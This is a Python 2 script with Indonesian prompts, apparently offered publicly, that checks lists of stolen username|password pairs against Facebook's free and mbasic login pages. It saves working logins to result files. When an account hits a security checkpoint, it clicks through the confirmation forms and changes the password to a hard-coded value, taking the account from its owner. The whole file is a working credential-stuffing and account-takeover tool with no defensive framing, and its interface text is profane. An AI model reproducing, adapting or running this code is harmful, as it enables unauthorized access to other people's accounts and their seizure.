# coding:utf-8

description='''
 * Coded By Itsuki
 * github : https://github.com/itsuki10
'''

import re
import os
import sys
from time import sleep

url="https://free.facebook.com"
useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
newpass="@ngentod"
if os.path.exists(".useragent"):
	if os.path.getsize(".useragent") != 0:
		useragent=open(".useragent").read().strip()

def file():
	fail=raw_input(" ? filename : ")
	while fail in (""," "):
		print(" ! jangan kosong")
		fail=raw_input(" ? filename : ")
	if fail.lower() == "set":
		set_ua()
	if os.path.exists(fail) == False:
		print(" ! file {} tidak ditemukan".format(fail))
		return file()
	return open(fail).read().splitlines()

def set_ua():
	print("\n * useragent saat ini : "+open(".useragent").read().strip()+"\n" if os.path.exists(".useragent") else "")
	ua=raw_input(" ? masukkan useragent : ")
	while ua in (""," "):
		print(" ! jangan kosong ngentod")
		ua=raw_input(" ? masukkan useragent : ")
	open(".useragent","w").write(ua)
	print("\n * sukses menganti user agent" if os.path.exists(".useragent") else "\n ! gagal mengganti useragent")
	exit(" * jalankan ulang tools nya")
	
def main():
	os.system("clear")
	ngetik("\n         ╔╗ ┬ ┬┌─┐┌─┐┌─┐┌─┐\n         ╠╩╗└┬┘├─┘├─┤└─┐└─┐\n         ╚═╝ ┴ ┴  ┴ ┴└─┘└─┘\n    Create By Itsuki-Kun For Public\n\n * ketik 'set' untuk mensetting user-agent\n\n * gunakan '|' sebagai pemisah")
	list_akun=file()
	if list_akun:
		select_method()
		print("\n * mengecek dimulai\n * semua hasil tersimpan di folder result\n")
		with ThreadPoolExecutor(max_workers=2) as su:
			for akun in list_akun:
				akun=akun.split("|")
				su.submit(eksekusi,akun[0],akun[1])
	else:
		exit(" ! error tidak diketahui")

def select_method(show=True):
	global url
	if show:
		print("\n [ Pilih Method Login ]")
		print(" 1. Free Facebook")
		print(" 2. Mbasic Facebook\n")
	select=raw_input(" ? pilih : ")
	while select in (""," "):
		print(" ! jangan kosong") 
		select=raw_input(" ? pilih : ")
	if select == "1":
		url=url
	elif select == "2":
		url=url.replace("free","mbasic")
	else:
		print(" ! isi yang bener ngentod")
		select_method(False)

def eksekusi(username,password):
	try:
		respons=login(username,password)
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
		eksekusi(username,password)
	session=respons[0]
	if "c_user" in session.cookies.get_dict():
		print("\n\x1b[1;32m +"+"~"*40+"+")
		print(" * status : login succes")
		print(" * {}|{}".format(username,password))
		print(" +"+"~"*40+"+\x1b[0m")
		open("result/ok.txt","a").write("{}|{}\n".format(username,password))
	elif "checkpoint" in session.cookies.get_dict():
		session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
		respon=tahap1(session,parser(respons[1].text))
		if respon == "new password":
			print("\n\x1b[1;32m +"+"~"*40+"+")
			print(" * status : succes, change password")
			print(" * {}|{}".format(username,newpass))
			print(" +"+"~"*40+"+\x1b[0m")
			open("result/newpass.txt","a").write("{}|{}\n".format(username,newpass))
		elif respon == "no change password":
			print("\n\x1b[1;32m +"+"~"*40+"+")
			print(" * status : succes, no change password")
			print(" * {}|{}".format(username,password))
			print(" +"+"~"*40+"+\x1b[0m")
			open("result/no_change.txt","a").write("{}|{}\n".format(username,password))
		else:
			print("===>> ChackPoints")
			print(" * {}|{}".format(username,password))
			if username not in open("result/cp.txt").read():
				open("result/cp.txt","a").write("{}|{}\n".format(username,password))
	else:
		print("===>> LOGIN GAGAL")
		print("===>> {}|{}".format(username,password))

def login(username,password,**kwargs):
	session=requests.session()
	parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
	kwargs=get_data(parsing,"sign_up")
	kwargs.update({"email":username,"pass":password})
	if '_fb_noscript' in kwargs:
		del kwargs['_fb_noscript']
	session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
	respon=session.post(url+get_action(parsing),data=kwargs)
	return session,respon

def tahap1(session,parsing):
	kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
	if "submit[Yes]" in kwargs:
		del kwargs["submit[No]"]
		try:
			respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
		except requests.exceptions.TooManyRedirects:
			respon="kontol"
		if "password_new" in respon or "buat kata sandi baru" in respon.lower():
			return tahap2(session,parser(respon))
		if "c_user" in session.cookies.get_dict():
			return "no change password"

def tahap2(session,parsing):
	kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
	kwargs.update({"password_new":newpass})
	respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
	if "c_user" in respons.cookies.get_dict():
		return "new password"

def get_data(parsing,kecuali,**kwargs):
	for lnput in parsing.find_all("input",{"name":True,"value":True}):
		if kecuali in lnput["name"]: continue
		else: kwargs.update({lnput["name"]:lnput["value"]})
	return kwargs

def get_action(parsing):
	return parsing.find("form",{"method":"post"})["action"]

def parser(html):
	return BeautifulSoup(html,"html.parser")

def ngetik(kata,jum=0.002):
	for x in kata + "\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(jum)
		
if __name__=="__main__":
	if sys.version[0]!="2":
		exit(" ! harap gunakan python2")
	import requests
	from bs4 import BeautifulSoup
	from concurrent.futures import ThreadPoolExecutor
	if os.path.exists("result") == False:
		os.mkdir("result")
	if os.path.exists("result/cp.txt") == False:
		open("result/cp.txt","a").close()
	main()
